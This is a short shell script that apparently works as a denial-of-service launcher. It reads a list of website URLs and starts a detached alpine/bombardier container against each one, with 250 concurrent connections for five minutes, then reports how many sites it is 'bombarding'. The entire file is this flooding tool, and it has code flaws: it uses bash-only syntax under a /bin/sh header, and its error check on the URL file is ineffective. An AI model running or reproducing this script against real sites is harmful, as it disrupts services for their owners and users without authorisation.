#!/bin/sh
connections=250
timer=300
urls=()

echo "Parsing urls ..."

# get urls list
while IFS= read -r line
do
	urls+=("$line")
done < urls.txt

if [ $? -ne 0 ]
then
	echo "Something went wrong while parsing urls.txt file, make sure it exists"
	exit 1
fi

echo "Pulling Docker image"

# validate docker is installed
sudo docker pull alpine/bombardier

if [ $? -ne 0 ]
then
	echo "Something went wrong while getting Docker image"
	exit 1
fi

bombarding_count=0

for url in "${urls[@]}"
do
	sudo docker run -d alpine/bombardier -c $connections -d "${timer}s" -l $url
	
	if [ $? -ne 0 ]
	then
		continue
	fi

	echo "Started bombarding $url with $connections connections for $timer seconds"
	((bombarding_count++))
done

echo "Successfully started bombarding $bombarding_count sites!"
exit 0
